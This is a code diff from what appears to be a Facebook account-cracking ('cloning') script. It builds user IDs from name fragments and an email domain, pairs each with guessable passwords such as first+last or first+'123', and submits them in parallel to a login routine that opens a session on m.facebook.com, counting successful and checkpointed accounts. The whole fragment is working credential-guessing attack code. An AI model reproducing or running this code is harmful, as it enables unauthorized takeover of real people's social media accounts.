@@ -973,7 +973,7 @@ def g_clone():
         print(f'{green}=> USE FLIGHT MODE ')
         print(f'{green}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
         for love in user:
-            uid = love+domain
+            uid = first+last+love+domain
             pwx = [first+last,first+'12',first+'123',first+'1234',first+'12345']
             if SUMONfire =='1':SUMON_xd.submit(mbasic,uid,pwx,tl)
             elif SUMONfire =='2':SUMON_xd.submit(p,uid,pwx,tl)
@@ -1247,11 +1247,8 @@ def mbasic(uid,pwx,tl):
     sys.stdout.write(f"\r {green}(M1) ({loop}) (OK-{len(oks)}) (CP-{len(cps)})\r"),
     sys.stdout.flush()
     try:
-        for pw in pwx:
-            first = random.choice(['sumon','abinash','rakesh','riya','ramesh','somnath'])
-            last = random.choice(['roy','das','sarkar','mondal'])
-            kl = first+last+uid
-            print(kl)
+        for pw in pwx:   
+            print(uid)
             print(pw)
             Session = requests.Session()
             free_fb = Session.get('https://m.facebook.com/').text
